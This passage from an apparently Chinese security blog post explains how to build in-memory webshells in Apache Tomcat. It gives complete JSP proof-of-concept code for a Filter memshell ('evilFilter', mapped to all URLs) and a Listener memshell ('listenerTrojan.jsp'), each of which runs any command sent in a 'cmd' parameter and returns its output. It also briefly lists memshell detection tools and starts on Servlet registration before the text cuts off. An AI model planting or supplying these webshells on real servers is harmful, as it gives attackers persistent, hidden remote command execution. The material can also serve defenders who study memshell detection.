ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">  <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">  <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">          isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        response.getWriter().write(output);</span><br><span class="line">        response.getWriter().flush();</span><br><span class="line">      &#125;</span><br><span class="line">      chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">  filterDef.setFilter(filter);</span><br><span class="line">  filterDef.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">  filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">  standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">  <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">  constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">  <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">  filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">  filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">  <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">  filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">  filterMap.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">  filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">  standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">  out.println(<span class="string">&quot;Inject done&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215628922.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215628922.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227215628922"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215641112.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215641112.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227215641112"></p><p>而且不需要指定jsp路径，因为注册的filterMap的pattern为<code>/*</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215956900.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215956900.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227215956900"></p><h2 id="排查内存马"><a href="#排查内存马" class="headerlink" title="排查内存马"></a>排查内存马</h2><h4 id="arthas"><a href="#arthas" class="headerlink" title="arthas"></a>arthas</h4><p>项目链接：<a href="https://github.com/alibaba/arthas">https://github.com/alibaba/arthas</a></p><p>我们可以利用该项目来检测我们的内存马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar arthas-boot.jar --telnet-port 9998 --http-port -1</span><br></pre></td></tr></table></figure><p>这里也可以直接 <code>java -jar arthas-boot.jar</code></p><h4 id="copagent"><a href="#copagent" class="headerlink" title="copagent"></a>copagent</h4><p>项目链接：<a href="https://github.com/LandGrey/copagent">https://github.com/LandGrey/copagent</a></p><h4 id="java-memshell-scanner"><a href="#java-memshell-scanner" class="headerlink" title="java-memshell-scanner"></a>java-memshell-scanner</h4><p>项目链接：<a href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a></p><h2 id="二、Listener内存马"><a href="#二、Listener内存马" class="headerlink" title="二、Listener内存马"></a>二、Listener内存马</h2><p>Listener用来监听对象创建、销毁、属性增删改，然后执行对应的操作。</p><p>在Tomcat中，Listener-&gt;Filter-&gt;Servlet依次执行。</p><p>Tomcat支持两种listener：<code>org.apache.catalina.LifecycleListener</code>和<code>Java.util.EvenListener</code>,前者一般不能使用</p><p>实现了EvenListener的ServletRequestListener可以监听Request请求的创建和销毁（这么好的类当然要拿来做内存马</p><h3 id="ServletRequestListener调用流程"><a href="#ServletRequestListener调用流程" class="headerlink" title="ServletRequestListener调用流程"></a>ServletRequestListener调用流程</h3><ul><li><p>request创建时：在servlet doGet方法处打上断点分析，然后get访问webservlet</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228134615308.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228134615308.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228134615308"></p></li></ul><p>servlet启动时，在StandardHostValue#invoke()中对监听器进行检查</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228134738674.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228134738674.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228134738674"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228135848468.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228135848468.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228135848468"></p><p>其中context.fireRequestInitEvent调用getApplicationEventListeners方法获取全部Listener</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228140322433.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228140322433.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228140322433"></p><p>if判断有Listener并且为ServletRequestListener子类，就调用ServletRequestListener#requestInitialized()方法</p><ul><li>Request销毁：</li></ul><p>在StandardHostValue#invoke()下面，调用fireRequestDistroyEvent()销毁</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228140857022.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228140857022.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228140857022"></p><p>实际上也就是getApplicationEventListeners方法获取全部Listener后，使用ServletRequestListener#requestDestroyed()方法</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228141004954.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228141004954.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228141004954"></p><p>由此可见生成Listener只需要经过两个方法，一个是requestInitialized()，一个是requestDestroyed()。这两个方法重写后效果是一样的</p><ul><li>构建Listener内存马流程：生成恶意Listener，然后放入Context</li></ul><h3 id="1-获取context-1"><a href="#1-获取context-1" class="headerlink" title="1.获取context"></a>1.获取context</h3><p>上文已经介绍了如何获取context，一样的通过反射获取Request，然后获取StandardContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure><h3 id="2-生成恶意Listener"><a href="#2-生成恶意Listener" class="headerlink" title="2.生成恶意Listener"></a>2.生成恶意Listener</h3><p>getParameter进行命令执行的地方就不多说了。创建Listener需要执行ServletRequestListener#requestInitialized()，那就new一个ServletRequestListener类然后重写requestInitialized方法。</p><p>ServletRequestEvent提供了getServletRequest()方法获取request</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228143920730.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228143920730.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228143920730"></p><p>上面获取context过程中用到的request1为Request对象，封装了getter获取response</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228144502202.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228144502202.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228144502202"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> request1.getResponse();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    resp.getWriter().write(out);</span><br><span class="line">                    resp.getWriter().flush();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException ioe)&#123;</span><br><span class="line">                    ioe.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-添加Listener"><a href="#3-添加Listener" class="headerlink" title="3.添加Listener"></a>3.添加Listener</h3><p>反射获取的StandardContext有addApplicationEventListener()添加Listener</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228144911877.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228144911877.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228144911877"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">standardContext.addApplicationEventListener(listener);</span><br></pre></td></tr></table></figure><p>注意这里request1需要用final修饰，不然在newServletRequestListener匿名内部类里无法使用，会报<code>Cannot refer to the non-final local variable request1 defined in an enclosing scope</code>错误</p><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// listenerTrojan.jsp</span></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">  requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br><span class="line">  <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">      <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">      <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> request1.getResponse();</span><br><span class="line">      <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">          <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">          <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">          <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">          resp.getWriter().write(out);</span><br><span class="line">          resp.getWriter().flush();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException ioe)&#123;</span><br><span class="line">          ioe.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  standardContext.addApplicationEventListener(listener);</span><br><span class="line">  out.println(<span class="string">&quot;inject done!&quot;</span>);</span><br><span class="line">  out.flush();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228161031927.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228161031927.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228161031927"></p><h2 id="三、Servlet内存马"><a href="#三、Servlet内存马" class="headerlink" title="三、Servlet内存马"></a>三、Servlet内存马</h2><p>Servlet开始于Web容器启动，直到Web容器停止运行。要注入servlet，就需要开启动态添加Servlet，在Tomcat7以后才有addServlet()方法</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228164745479.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228164745479.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228164745479"></p><h3 id="Servlet生成与配置"><a href="#Servlet生成与配置" class="headerlink" title="Servlet生成与配置"></a>Servlet生成与配置</h3><h4 id="Servlet注册"><a href="#Servlet注册" class="headerlink" title="Servlet注册"></a>Servlet注册</h4><p>Context 负责管理 Wapper ，而 Wapper 又负责管理 Servlet 实例。</p><p>通过StandardContext.createWapper()创建Wapper对象。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228165443196.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228165443196.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228165443196"></p><p>创建好了Wapper，跟进一下Servlet配置流程，在 org.apache.catalina.core.StandardWapper#setServletClass() 下断点</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170338418.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170338418.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228170338418"></p><p>在ContextConfig#webconfig()处配置webconfig，根据web.xml配置context</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170613977.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170613977.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228170613977"></p><p>然后调用了configureContext()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170844431.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228170844431.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228170844431"></p><p>configureContext()依次读取了 Filter、Listener、Servlet的配置及其映射</p><p>在Servlet部分createWrapper()、设置了启动优先级LoadOnStartUp以及servletName。这里loadOnStartup就是负责动态添加Servlet的函数</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228171737407.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228171737407.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228171737407"></p><p>然后设置了servletClass</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228171953290.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228171953290.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228171953290"></p><p>最后把wrapper 添加进context的child</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228172017882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228172017882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228172017882"></p><p>循环遍历完了所有servlets，接下来添加Servlet-Mapper，也就是web.xml中的<code>&lt;servlet-mapping&gt;</code>。循环addServletMappingDecoded将url和servlet类做映射</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228204837168.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228204837168.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228204837168"></p><p>总结一下servlet注册过程：</p><ol><li>调用StandardContext.createWrapper为servlet创建wrapper</li><li>配置LoadOnStartup启动优先级</li><li>配置ServletName</li><li>配置ServletClass</li><li>addChild添加wrapper到Context</li><li>addServletMappingDecode添加映射</li></ol><p>其实到这里就能模拟servlet注册构造内存马了</p><p>不过LoadOnStartup设置优先级，也就是动态添加servlet的过程还不清楚</p><h4 id="wrapper装载"><a href="#wrapper装载" class="headerlink" title="wrapper装载"></a>wrapper装载</h4><p>跟进到startInternal，发现在加载完Listener和Filter后，开始loadOnstartup</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228211713270.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228211713270.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228211713270"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228211738904.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228211738904.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228211738904"></p><p>findChildren()将所有Wrapper传入loadOnStartup()处理，loadOnStartup获取到所有Wrapperchild，并且getLoadOnstartup获取到servlet启动顺序，&gt;&#x3D;0的存放在wapper_list</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228212118310.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228212118310.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228212118310"></p><p>如果loadOnstartup&lt;0，则不会被动态添加到容器。该属性对应了web.xml中的<code>&lt;load-on-startup&gt;</code>，该属性默认-1</p><p>循环装载wrapper</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228212926651.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221228212926651.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221228212926651"></p><p>装载过程总的一句话，LoadOnStartup&gt;&#x3D;0才行</p><h3 id="1-获取context-2"><a href="#1-获取context-2" class="headerlink" title="1.获取context"></a>1.获取context</h3><figure class="highlight java"><table><tr><td 